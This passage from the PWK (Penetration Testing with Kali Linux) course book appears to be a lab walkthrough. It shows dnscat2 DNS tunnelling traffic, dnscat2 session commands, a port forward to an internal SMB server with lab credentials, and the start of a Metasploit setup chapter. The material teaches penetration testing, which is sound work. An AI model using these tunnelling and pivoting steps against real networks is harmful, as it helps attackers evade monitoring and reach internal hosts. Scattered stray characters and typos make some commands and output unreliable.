07:22:17.407889 IP 192.168.50.64.50621 > 192.168.118.4.domain: 39215+ MX?
cd6f0158e082e5562128b71e1353f111be.feline.corp. (64)
07:22:17.408397 IP 192.168.118.4.domain > 192.168.50.64.50621: 39215 1/0/0 MX
985d0158e00880dad6ec05ffff57240ba6.feline.corp. 10 (126)
07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT?
49660140b6509f242f870119c47da533b7.feline.corp. (75)
07:22:17.762610 IP 192.168.118.4.domain > 192.168.50.64.49720: 51139 1/0/0 TXT
"8a3d0140b6b05bb6c723aeffff0866c42a" (111)
07:22:18.417721 IP 192.168.50.64.50805 > 192.168.118.4.domain: 57236+ TXT?
3e450158e0e52d9dbf02e91e1492b9d0c5.feline.corp. (64) y
07:22:18.418149 IP 192.168.118.4.domain > 192.168.50.64.50805: 57236 1/0/0 TXT
"541d0158e09264101bde14ffff57240ba6" (111)
07:22:18.772152 IP 192.168.50.64.50433 > 192.168.118.4.dkomain: 7172+ [1au] TXT?
d34f0140b6d6bd4779cb2419c56ad7d600.feline.corp. (75)
07:22:18.772847 IP 192.168.118.4.domain > 192.168.50.64.50433: 7172 1/0/0 TXT
s
"17880140b6d23c86eaefe7ffff0866c42a" (111)
07:22:19.427556 IP 192.168.50.64.50520 > 192.168.118.4.domain: 53513+ CNAME?
8cd10158e01762c61a056c1e1537228bcc.feline.corop. (64)
07:22:19.428064 IP 192.168.118.4.domain > 192.168.50.64.50520: 53513 1/0/0 CNAME
b6e10158e0a682c6c1ca43ffff57240ba6.feline.corp. (124)
07:22:19.782712 IP 192.168.50.64.50186 n> 192.168.118.4.domain: 58205+ [1au] TXT?
8d5a0140b66454099e7a8119c648dffe8e.feline.corp. (75)
07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT
"2b4c0140b608687c966b10ffff0866ci42a" (111)
07:22:20.438134 IP 192.168.50.z64.65235 > 192.168.118.4.domain: 52335+ CNAME?
b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
07:22:20.438643 IP 192.168.118.4.domain > 192.168.50.64.65235: 52335 1/0/0 CNAME
D
c0330158e07c85b2dfc880ffff57240ba6.feline.corp. (124)
07:22:20.792283 IP 192.168.50.64.50938 > 192.168.118.4.domain: 958+ [1au] TXT?
b2d20140b600440d37090f19c79d9f6918.feline.corp. (75)
...
Listing 612 - Lots of DNS queries made to feline.corp, as seen in tcpdump.
The dnscat2 process is using CNAME, TXT, and MX queries and responses. As indicated by this
network data, DNS tunneling is certainly not stealthy! This output reveals a huge data transfer
C c
from the dnscat2 client to the server. All the request and response payloads are encrypted, so it’s
not particularly beneficial to keep logging the traffic. We’ll go ahead and kill tcpdump with + .
Now we’ll start interacting with our session from the dnscat2 server. Let’s list all the active
windows with the windows command, then run window -i from our new “command” shell to list
the available commands.
dnscat2> windows
0 :: main [active]
crypto-debug :: Debug window for crypto stuff [*]
dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 632
Made in Morocco
Penetration Testing with Kali Linux
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Annoy Mona Spiced Outran Stump Visas
This is a command session!
That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.
command (pgdatabase01) 1> ?
Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo y
* exec
* help
* listen k
* ping
* quit
s
* set
* shell
* shutdown o
* suspend
* tunnels
* unset n
* upload
* window
* windows i
command (pgdatabase01) 1> z
Listing 613 - Interacting with the dnscat2 client from the server.
This returns a prompt withD a “command” prefix. This is the dnscat2 command session, and it
supports quite a few options. We can learn more about each command by running it with the --
help flag.
Since we’re trying to tunnel in this Module, let’s investigate the port forwarding options. We can
use listen to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS
C z
tunnel, where it will be decapsulated and pushed to a socket we specify. Let’s background our
console session by pressing + . Back in the command session, let’s run listen --help.
command (pgdatabase01) 1> listen --help
Error: The user requested help
Listens on a local port and sends the connection out the other side (like ssh
-L). Usage: listen [:] :
--help, -h: Show this message
Listing 614 - Information on the listen command.
According to the help message output, listen operates much like ssh -L. And we should be very
familiar with that by now.
Let’s try to connect to the SMB port on HRSHARES, this time through our DNS tunnel. We’ll set up
a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and
forwarding to 445 on HRSHARES.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 633
Made in Morocco
Penetration Testing with Kali Linux
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase01) 1>
Listing 615 - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01.
From another shell on FELINEAUTHORITY we can list the SMB shares through this port forward.
kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --
password=Welcome1234
Password for [WORKGROUP\hr_admin]:
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC y
scripts Disk
Users Disk
Reconnecting with SMB1 for workgroup listing. k
do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
s
Listing 616 - Connecting to HRSHARES’s SMB server through the dnscat2 port forward.
The connection is slower than a direct connectoion, but this is expected given that our SMB
packets are being transported through the dnscat2 DNS tunnel. TCP-based SMB packets,
encapsulated in DNS requests and responses transported over UDP, are pinging back and forth to
n
the SMB server on HRSHARES, deep in the internal network. Excellent!
In this Learning Unit we used dnscat2 to tunnel SMB traffic through DNS requests and responses.
i
We used that to list the available shares on a host deep inside the internal network, despite the
z
fact that neither HRSHARES or PGDATABASE01 had direct connectivity to our
FELINEAUTHORITY server.
D
19.3 Wrapping Up
In this Module, we covered both HTTP and DNS tunneling. These strategies may be useful when
trying to traverse more hardened network environments, in particular to bypass systems that
perform deep packet inspection, or other network traffic analysis. We performed HTTP tunneling
with Chisel, and DNS tunneling with dnscat2 - and experienced some of the pros and cons of
both.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 634
Made in Morocco
Penetration Testing with Kali Linux
20 The Metasploit Framework
In this Learning Module, we will cover the following Learning Units:
• Getting Familiar with Metasploit
• Using Metasploit Payloads
• Performing Post-Exploitation with Metasploit
• Automating Metasploit
As we have worked through previous Modules, it should be clear that locating, working with, and
fixing public exploits is difficult. They must be modified to fit each scenario and tested for
malicious code. Each uses a unique command-line syntax and there is no standardization in
y
coding practices or languages.
In addition, even in the most basic attack scenarios, there is ka variety of post-exploitation tools,
auxiliary tools, and attack techniques to consider.
s
Exploit frameworks aim to address some or all of these issues. Although they vary somewhat in
form and function, each aims to consolidate and streamline the process of exploitation by
o
offering a variety of exploits, simplifying the usage of these exploits, easing lateral movement, and
assisting with the management of compromised infrastructure. Most of these frameworks offer
dynamic payload capabilities. This means that for each exploit in the framework, we can choose
n
various payloads to deploy.
Over the past few years, several expiloit and post-exploitation frameworks have been developed,
including Metasploit,964 Covenanzt,965 Cobalt Strike,966 and PowerShell Empire,967 each offering
some or all of these capabilities.
While frameworks such asD Cobalt Strike are commercial offerings, the Metasploit Framework
(MSF, or simply Metasploit) is open-source, frequently updated, and the focus of this Module.
The Metasploit Framework, maintained by Rapid7,968 is described by its authors as “an advanced
platform for developing, testing, and using exploit code”. The project initially started off as a
portable network game969 and has evolved into a powerful tool for penetration testing, exploit
development, and vulnerability research. The Framework has slowly but surely become the
leading free exploit collection and development framework for security auditors. Metasploit is
frequently updated with new exploits and is constantly being improved and further developed by
Rapid7 and the security community.
Kali Linux includes the metasploit-framework970 package, which contains the open source
elements of the Metasploit project. Newcomers to Metasploit are often overwhelmed by the
964 (Metasploit Rapi7, 202), https://www.metasploit.com/
965 (Github, 2021), https://github.com/cobbr/Covenant
966 (Cobalt Strike, 2022), https://www.cobaltstrike.com/
967 (Github, 2022), https://github.com/BC-SECURITY/Empire
968 (Rapid7, 2022), https://www.rapid7.com/
969 (ThreatPost, 2010), https://threatpost.com/qa-hd-moore-metasploit-disclosure-and-ethics-052010/73998/
970 (Kali, 2022), https://www.kali.org/tools/metasploit-framework/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 635
Made in Morocco
Penetration Testing with Kali Linux
multitude of features and different use-cases for the tool as it includes components for
information gathering, vulnerability research and development, client-side attacks, post-
exploitation, and much more.
With such overwhelming capabilities, it’s easy to get lost within Metasploit. Fortunately, the
framework is well thought out and offers a unified and sensible interface.
In this Module, we will provide a walkthrough of the Metasploit Framework, including features and
usage along with some explanation of its inner workings. While we cover Metasploit in particular,
we’ll discuss various concepts which are true for other exploit frameworks as well. The main goal
of this Module is to understand how these frameworks can assist us in a real penetration test.
20.1 Getting Familiar with Metasploit
This Learning Unit covers the following Learning Objectives: y
• Setup and navigate Metasploit
k
• Use auxiliary modules
• Leverage exploit modules s
In this Learning Unit, we will get familiar with the Metasploit Framework (MSF). We’ll start with
o
setting up the environment and navigating through the framework. Then, we’ll get familiar with
two types of modules.971 In Metasploit, modules are the primary way of interacting with the
framework and are used to perform tasksn such as scanning or exploiting a target. First, we’ll
explore Metasploit’s auxiliary modules and how we can use them for tasks such as protocol
enumeration and port scanning. Finally, we’ll review exploit modules contained in Metasploit.
i
20.1.1 Setup and Worzk with MSF
Although the Metasploit FraDmework comes preinstalled on Kali Linux, it’s not starting a database
service in its default configuration. While using a database is not mandatory to run Metasploit,
there are various compelling reasons to do so, such as storing information about target hosts and
keeping track of successful exploitation attempts. Metasploit uses PostgreSQL972 as a database
service, which is neither active nor enabled on boot time on Kali.
We can start the database service as well as create and initialize the MSF database with msfdb
init.
kali@kali:~$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
Listing 617 - Creating and initializing the Metasploit database
971 (Rapid7 Documentation, 2022), https://docs.rapid7.com/metasploit/modules/
972 (PostgreSQL, 2022), https://www.postgresql.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 636
Made in Morocco
Penetration Testing with Kali Linux
To enable the database service at boot time we can use systemctl.973
kali@kali:~$ sudo systemctl enable postgresql
Synchronizing state of postgresql.service with SysV service script with
/lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable postgresql
Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service →
/lib/systemd/system/postgresql.service.
Listing 618 - Enabling the postgresql database service at boot time
Now, let’s launch the Metasploit command-line interface with msfconsole.974
kali@kali:~$ sudo msfconsole
...
=[ metasploit v6.2.20-dev ]
+ -- --=[ 2251 exploits - 1187 auxiliary - 399 post ] y
+ -- --=[ 951 payloads - 45 encoders - 11 nops ]
+ -- --=[ 9 evasion ]
k
Metasploit tip: Use help  to learn more
about any command
s
Metasploit Documentation: https://docs.metasploit.com/
msf6 > o
Listing 619 - Starting the Metasploit Framework
To hide the banner and version informationn while starting up, we can add the -q option to the
msfconsole command.
Once the Metasploit command-line iinterface is started, we can verify database connectivity with
db_status. z
msf6 > db_status
D
[*] Connected to msf. Connection type: postgresql.
Listing 620 - Confirming database connectivity
Listing 620 shows that the database is connected and we are all set up. Now, let’s get familiar
with the command-line interface of Metasploit and how to use it.
The command-line interface of Metasploit provides numerous commands to navigate and use
the framework, divided into categories.975 These categories consist of Core Commands, Module
Commands, Job Commands, Resource Script Commands, Database Backend Commands,
Credentials Backend Commands, and Developer Commands. Throughout this Module, we’ll use
commands from most of these categories.
We can get a list of all available commands by entering help.
msf6 > help
Core Commands
973 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Systemd
974 (Rapid7 Documentation, 2022), https://docs.rapid7.com/metasploit/msf-overview/
975 (OffSec, 2023), https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 637
Made in Morocco
Penetration Testing with Kali Linux
=============
Command Description
------- -----------
? Help menu
...
Module Commands
===============
Command Description
------- -----------
...
search Searches module names and descriptions
show Displays modules of a given type, or all modules
use Interact with a module by name or search teyrm/index
Job Commands k
============
s
Command Description
------- -----------
... o